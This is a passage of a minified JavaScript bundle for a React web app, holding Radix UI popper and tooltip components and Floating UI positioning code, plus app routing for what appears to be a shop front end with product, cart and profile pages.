Y={...z,isPositioned:D.current!==!1};V.current&&!Jd(b.current,Y)&&(b.current=Y,ac.flushSync(()=>{f(Y)}))})},[h,e,n,O,D]);qu(()=>{u===!1&&b.current.isPositioned&&(b.current.isPositioned=!1,f(L=>({...L,isPositioned:!1})))},[u]);const V=v.useRef(!1);qu(()=>(V.current=!0,()=>{V.current=!1}),[]),qu(()=>{if(N&&(j.current=N),R&&(T.current=R),N&&R){if(k.current)return k.current(N,R,A);A()}},[N,R,A,k,P]);const Z=v.useMemo(()=>({reference:j,floating:T,setReference:w,setFloating:S}),[w,S]),q=v.useMemo(()=>({reference:N,floating:R}),[N,R]),J=v.useMemo(()=>{const L={position:n,left:0,top:0};if(!q.floating)return L;const z=aE(q.floating,p.x),Y=aE(q.floating,p.y);return a?{...L,transform:"translate("+z+"px, "+Y+"px)",...BN(q.floating)>=1.5&&{willChange:"transform"}}:{position:n,left:z,top:Y}},[n,a,q.floating,p.x,p.y]);return v.useMemo(()=>({...p,update:A,refs:Z,elements:q,floatingStyles:J}),[p,A,Z,q,J])}const cz=t=>{function e(n){return{}.hasOwnProperty.call(n,"current")}return{name:"arrow",options:t,fn(n){const{element:r,padding:i}=typeof t=="function"?t(n):t;return r&&e(r)?r.current!=null?oE({element:r.current,padding:i}).fn(n):{}:r?oE({element:r,padding:i}).fn(n):{}}}},uz=(t,e)=>({...tz(t),options:[t,e]}),dz=(t,e)=>({...nz(t),options:[t,e]}),hz=(t,e)=>({...oz(t),options:[t,e]}),fz=(t,e)=>({...rz(t),options:[t,e]}),pz=(t,e)=>({...iz(t),options:[t,e]}),mz=(t,e)=>({...sz(t),options:[t,e]}),gz=(t,e)=>({...cz(t),options:[t,e]});var vz="Arrow",VN=v.forwardRef((t,e)=>{const{children:n,width:r=10,height:i=5,...s}=t;return d.jsx(pe.svg,{...s,ref:e,width:r,height:i,viewBox:"0 0 30 10",preserveAspectRatio:"none",children:t.asChild?n:d.jsx("polygon",{points:"0,0 30,0 15,10"})})});VN.displayName=vz;var yz=VN;function _z(t,e=[]){let n=[];function r(s,o){const a=v.createContext(o),c=n.length;n=[...n,o];function u(f){const{scope:h,children:E,..._}=f,y=(h==null?void 0:h[t][c])||a,C=v.useMemo(()=>_,Object.values(_));return d.jsx(y.Provider,{value:C,children:E})}function p(f,h){const E=(h==null?void 0:h[t][c])||a,_=v.useContext(E);if(_)return _;if(o!==void 0)return o;throw new Error(`\`${f}\` must be used within \`${s}\``)}return u.displayName=s+"Provider",[u,p]}const i=()=>{const s=n.map(o=>v.createContext(o));return function(a){const c=(a==null?void 0:a[t])||s;return v.useMemo(()=>({[`__scope${t}`]:{...a,[t]:c}}),[a,c])}};return i.scopeName=t,[r,wz(i,...e)]}function wz(...t){const e=t[0];if(t.length===1)return e;const n=()=>{const r=t.map(i=>({useScope:i(),scopeName:i.scopeName}));return function(s){const o=r.reduce((a,{useScope:c,scopeName:u})=>{const f=c(s)[`__scope${u}`];return{...a,...f}},{});return v.useMemo(()=>({[`__scope${e.scopeName}`]:o}),[o])}};return n.scopeName=e.scopeName,n}var HN="Popper",[WN,KN]=_z(HN),[rB,GN]=WN(HN),qN="PopperAnchor",YN=v.forwardRef((t,e)=>{const{__scopePopper:n,virtualRef:r,...i}=t,s=GN(qN,n),o=v.useRef(null),a=We(e,o);return v.useEffect(()=>{s.onAnchorChange((r==null?void 0:r.current)||o.current)}),r?null:d.jsx(pe.div,{...i,ref:a})});YN.displayName=qN;var Hy="PopperContent",[xz,Ez]=WN(Hy),QN=v.forwardRef((t,e)=>{var pt,zn,Bn,Gt,cr,Vn;const{__scopePopper:n,side:r="bottom",sideOffset:i=0,align:s="center",alignOffset:o=0,arrowPadding:a=0,avoidCollisions:c=!0,collisionBoundary:u=[],collisionPadding:p=0,sticky:f="partial",hideWhenDetached:h=!1,updatePositionStrategy:E="optimized",onPlaced:_,...y}=t,C=GN(Hy,n),[x,w]=v.useState(null),S=We(e,_n=>w(_n)),[N,R]=v.useState(null),j=jy(N),T=(j==null?void 0:j.width)??0,b=(j==null?void 0:j.height)??0,P=r+(s!=="center"?"-"+s:""),k=typeof p=="number"?p:{top:0,right:0,bottom:0,left:0,...p},O=Array.isArray(u)?u:[u],D=O.length>0,A={padding:k,boundary:O.filter(Sz),altBoundary:D},{refs:V,floatingStyles:Z,placement:q,isPositioned:J,middlewareData:L}=lz({strategy:"fixed",placement:P,whileElementsMounted:(..._n)=>ez(..._n,{animationFrame:E==="always"}),elements:{reference:C.anchor},middleware:[uz({mainAxis:i+b,alignmentAxis:o}),c&&dz({mainAxis:!0,crossAxis:!1,limiter:f==="partial"?hz():void 0,...A}),c&&fz({...A}),pz({...A,apply:({elements:_n,rects:ur,availableWidth:Ur,availableHeight:wn})=>{const{width:ma,height:ga}=ur.reference,qe=_n.floating.style;qe.setProperty("--radix-popper-available-width",`${Ur}px`),qe.setProperty("--radix-popper-available-height",`${wn}px`),qe.setProperty("--radix-popper-anchor-width",`${ma}px`),qe.setProperty("--radix-popper-anchor-height",`${ga}px`)}}),N&&gz({element:N,padding:a}),bz({arrowWidth:T,arrowHeight:b}),h&&mz({strategy:"referenceHidden",...A})]}),[z,Y]=ZN(q),K=sn(_);ji(()=>{J&&(K==null||K())},[J,K]);const Q=(pt=L.arrow)==null?void 0:pt.x,X=(zn=L.arrow)==null?void 0:zn.y,Re=((Bn=L.arrow)==null?void 0:Bn.centerOffset)!==0,[Je,ye]=v.useState();return ji(()=>{x&&ye(window.getComputedStyle(x).zIndex)},[x]),d.jsx("div",{ref:V.setFloating,"data-radix-popper-content-wrapper":"",style:{...Z,transform:J?Z.transform:"translate(0, -200%)",minWidth:"max-content",zIndex:Je,"--radix-popper-transform-origin":[(Gt=L.transformOrigin)==null?void 0:Gt.x,(cr=L.transformOrigin)==null?void 0:cr.y].join(" "),...((Vn=L.hide)==null?void 0:Vn.referenceHidden)&&{visibility:"hidden",pointerEvents:"none"}},dir:t.dir,children:d.jsx(xz,{scope:n,placedSide:z,onArrowChange:R,arrowX:Q,arrowY:X,shouldHideArrow:Re,children:d.jsx(pe.div,{"data-side":z,"data-align":Y,...y,ref:S,style:{...y.style,animation:J?void 0:"none"}})})})});QN.displayName=Hy;var XN="PopperArrow",Cz={top:"bottom",right:"left",bottom:"top",left:"right"},JN=v.forwardRef(function(e,n){const{__scopePopper:r,...i}=e,s=Ez(XN,r),o=Cz[s.placedSide];return d.jsx("span",{ref:s.onArrowChange,style:{position:"absolute",left:s.arrowX,top:s.arrowY,[o]:0,transformOrigin:{top:"",right:"0 0",bottom:"center 0",left:"100% 0"}[s.placedSide],transform:{top:"translateY(100%)",right:"translateY(50%) rotate(90deg) translateX(-50%)",bottom:"rotate(180deg)",left:"translateY(50%) rotate(-90deg) translateX(50%)"}[s.placedSide],visibility:s.shouldHideArrow?"hidden":void 0},children:d.jsx(yz,{...i,ref:n,style:{...i.style,display:"block"}})})});JN.displayName=XN;function Sz(t){return t!==null}var bz=t=>({name:"transformOrigin",options:t,fn(e){var C,x,w;const{placement:n,rects:r,middlewareData:i}=e,o=((C=i.arrow)==null?void 0:C.centerOffset)!==0,a=o?0:t.arrowWidth,c=o?0:t.arrowHeight,[u,p]=ZN(n),f={start:"0%",center:"50%",end:"100%"}[p],h=(((x=i.arrow)==null?void 0:x.x)??0)+a/2,E=(((w=i.arrow)==null?void 0:w.y)??0)+c/2;let _="",y="";return u==="bottom"?(_=o?f:`${h}px`,y=`${-c}px`):u==="top"?(_=o?f:`${h}px`,y=`${r.floating.height+c}px`):u==="right"?(_=`${-c}px`,y=o?f:`${E}px`):u==="left"&&(_=`${r.floating.width+c}px`,y=o?f:`${E}px`),{data:{x:_,y}}}});function ZN(t){const[e,n="center"]=t.split("-");return[e,n]}var Tz=YN,Iz=QN,Nz=JN,[ef,iB]=Xo("Tooltip",[KN]),Wy=KN(),ek="TooltipProvider",kz=700,lE="tooltip.open",[Pz,tk]=ef(ek),nk=t=>{const{__scopeTooltip:e,delayDuration:n=kz,skipDelayDuration:r=300,disableHoverableContent:i=!1,children:s}=t,[o,a]=v.useState(!0),c=v.useRef(!1),u=v.useRef(0);return v.useEffect(()=>{const p=u.current;return()=>window.clearTimeout(p)},[]),d.jsx(Pz,{scope:e,isOpenDelayed:o,delayDuration:n,onOpen:v.useCallback(()=>{window.clearTimeout(u.current),a(!1)},[]),onClose:v.useCallback(()=>{window.clearTimeout(u.current),u.current=window.setTimeout(()=>a(!0),r)},[r]),isPointerInTransitRef:c,onPointerInTransitChange:v.useCallback(p=>{c.current=p},[]),disableHoverableContent:i,children:s})};nk.displayName=ek;var rk="Tooltip",[sB,tf]=ef(rk),vg="TooltipTrigger",Rz=v.forwardRef((t,e)=>{const{__scopeTooltip:n,...r}=t,i=tf(vg,n),s=tk(vg,n),o=Wy(n),a=v.useRef(null),c=We(e,a,i.onTriggerChange),u=v.useRef(!1),p=v.useRef(!1),f=v.useCallback(()=>u.current=!1,[]);return v.useEffect(()=>()=>document.removeEventListener("pointerup",f),[f]),d.jsx(Tz,{asChild:!0,...o,children:d.jsx(pe.button,{"aria-describedby":i.open?i.contentId:void 0,"data-state":i.stateAttribute,...r,ref:c,onPointerMove:ie(t.onPointerMove,h=>{h.pointerType!=="touch"&&!p.current&&!s.isPointerInTransitRef.current&&(i.onTriggerEnter(),p.current=!0)}),onPointerLeave:ie(t.onPointerLeave,()=>{i.onTriggerLeave(),p.current=!1}),onPointerDown:ie(t.onPointerDown,()=>{u.current=!0,document.addEventListener("pointerup",f,{once:!0})}),onFocus:ie(t.onFocus,()=>{u.current||i.onOpen()}),onBlur:ie(t.onBlur,i.onClose),onClick:ie(t.onClick,i.onClose)})})});Rz.displayName=vg;var Az="TooltipPortal",[oB,Oz]=ef(Az,{forceMount:void 0}),Go="TooltipContent",Dz=v.forwardRef((t,e)=>{const n=Oz(Go,t.__scopeTooltip),{forceMount:r=n.forceMount,side:i="top",...s}=t,o=tf(Go,t.__scopeTooltip);return d.jsx(qi,{present:r||o.open,children:o.disableHoverableContent?d.jsx(ik,{side:i,...s,ref:e}):d.jsx(jz,{side:i,...s,ref:e})})}),jz=v.forwardRef((t,e)=>{const n=tf(Go,t.__scopeTooltip),r=tk(Go,t.__scopeTooltip),i=v.useRef(null),s=We(e,i),[o,a]=v.useState(null),{trigger:c,onClose:u}=n,p=i.current,{onPointerInTransitChange:f}=r,h=v.useCallback(()=>{a(null),f(!1)},[f]),E=v.useCallback((_,y)=>{const C=_.currentTarget,x={x:_.clientX,y:_.clientY},w=Uz(x,C.getBoundingClientRect()),S=$z(x,w),N=zz(y.getBoundingClientRect()),R=Vz([...S,...N]);a(R),f(!0)},[f]);return v.useEffect(()=>()=>h(),[h]),v.useEffect(()=>{if(c&&p){const _=C=>E(C,p),y=C=>E(C,c);return c.addEventListener("pointerleave",_),p.addEventListener("pointerleave",y),()=>{c.removeEventListener("pointerleave",_),p.removeEventListener("pointerleave",y)}}},[c,p,E,h]),v.useEffect(()=>{if(o){const _=y=>{const C=y.target,x={x:y.clientX,y:y.clientY},w=(c==null?void 0:c.contains(C))||(p==null?void 0:p.contains(C)),S=!Bz(x,o);w?h():S&&(h(),u())};return document.addEventListener("pointermove",_),()=>document.removeEventListener("pointermove",_)}},[c,p,o,u,h]),d.jsx(ik,{...t,ref:s})}),[Mz,Lz]=ef(rk,{isInside:!1}),ik=v.forwardRef((t,e)=>{const{__scopeTooltip:n,children:r,"aria-label":i,onEscapeKeyDown:s,onPointerDownOutside:o,...a}=t,c=tf(Go,n),u=Wy(n),{onClose:p}=c;return v.useEffect(()=>(document.addEventListener(lE,p),()=>document.removeEventListener(lE,p)),[p]),v.useEffect(()=>{if(c.trigger){const f=h=>{const E=h.target;E!=null&&E.contains(c.trigger)&&p()};return window.addEventListener("scroll",f,{capture:!0}),()=>window.removeEventListener("scroll",f,{capture:!0})}},[c.trigger,p]),d.jsx(mh,{asChild:!0,disableOutsidePointerEvents:!1,onEscapeKeyDown:s,onPointerDownOutside:o,onFocusOutside:f=>f.preventDefault(),onDismiss:p,children:d.jsxs(Iz,{"data-state":c.stateAttribute,...u,...a,ref:e,style:{...a.style,"--radix-tooltip-content-transform-origin":"var(--radix-popper-transform-origin)","--radix-tooltip-content-available-width":"var(--radix-popper-available-width)","--radix-tooltip-content-available-height":"var(--radix-popper-available-height)","--radix-tooltip-trigger-width":"var(--radix-popper-anchor-width)","--radix-tooltip-trigger-height":"var(--radix-popper-anchor-height)"},children:[d.jsx(DS,{children:r}),d.jsx(Mz,{scope:n,isInside:!0,children:d.jsx(RA,{id:c.contentId,role:"tooltip",children:i||r})})]})})});Dz.displayName=Go;var sk="TooltipArrow",Fz=v.forwardRef((t,e)=>{const{__scopeTooltip:n,...r}=t,i=Wy(n);return Lz(sk,n).isInside?null:d.jsx(Nz,{...i,...r,ref:e})});Fz.displayName=sk;function Uz(t,e){const n=Math.abs(e.top-t.y),r=Math.abs(e.bottom-t.y),i=Math.abs(e.right-t.x),s=Math.abs(e.left-t.x);switch(Math.min(n,r,i,s)){case s:return"left";case i:return"right";case n:return"top";case r:return"bottom";default:throw new Error("unreachable")}}function $z(t,e,n=5){const r=[];switch(e){case"top":r.push({x:t.x-n,y:t.y+n},{x:t.x+n,y:t.y+n});break;case"bottom":r.push({x:t.x-n,y:t.y-n},{x:t.x+n,y:t.y-n});break;case"left":r.push({x:t.x+n,y:t.y-n},{x:t.x+n,y:t.y+n});break;case"right":r.push({x:t.x-n,y:t.y-n},{x:t.x-n,y:t.y+n});break}return r}function zz(t){const{top:e,right:n,bottom:r,left:i}=t;return[{x:i,y:e},{x:n,y:e},{x:n,y:r},{x:i,y:r}]}function Bz(t,e){const{x:n,y:r}=t;let i=!1;for(let s=0,o=e.length-1;s<e.length;o=s++){const a=e[s].x,c=e[s].y,u=e[o].x,p=e[o].y;c>r!=p>r&&n<(u-a)*(r-c)/(p-c)+a&&(i=!i)}return i}function Vz(t){const e=t.slice();return e.sort((n,r)=>n.x<r.x?-1:n.x>r.x?1:n.y<r.y?-1:n.y>r.y?1:0),Hz(e)}function Hz(t){if(t.length<=1)return t.slice();const e=[];for(let r=0;r<t.length;r++){const i=t[r];for(;e.length>=2;){const s=e[e.length-1],o=e[e.length-2];if((s.x-o.x)*(i.y-o.y)>=(s.y-o.y)*(i.x-o.x))e.pop();else break}e.push(i)}e.pop();const n=[];for(let r=t.length-1;r>=0;r--){const i=t[r];for(;n.length>=2;){const s=n[n.length-1],o=n[n.length-2];if((s.x-o.x)*(i.y-o.y)>=(s.y-o.y)*(i.x-o.x))n.pop();else break}n.push(i)}return n.pop(),e.length===1&&n.length===1&&e[0].x===n[0].x&&e[0].y===n[0].y?e:e.concat(n)}var Wz=nk;const Kz=new LO({defaultOptions:{queries:{staleTime:5*60*1e3,retry:1}}}),Gz=()=>d.jsx(UO,{client:Kz,children:d.jsx(Wz,{children:d.jsx(e6,{children:d.jsxs(n6,{children:[d.jsx($2,{}),d.jsx(mO,{}),d.jsx(MD,{children:d.jsxs(ND,{children:[d.jsx(os,{path:"/",element:d.jsx(W9,{})}),d.jsx(os,{path:"/products",element:d.jsx(g$,{})}),d.jsx(os,{path:"/product/:id",element:d.jsx(v$,{})}),d.jsx(os,{path:"/cart",element:d.jsx(y$,{})}),d.jsx(os,{path:"/profile",element:d.jsx(_$,{})}),d.jsx(os,{path:"*",element:d.jsx(K9,{})})]})})]})})})});AS(document.getElementById("root")).render(d.jsx(Gz,{}));
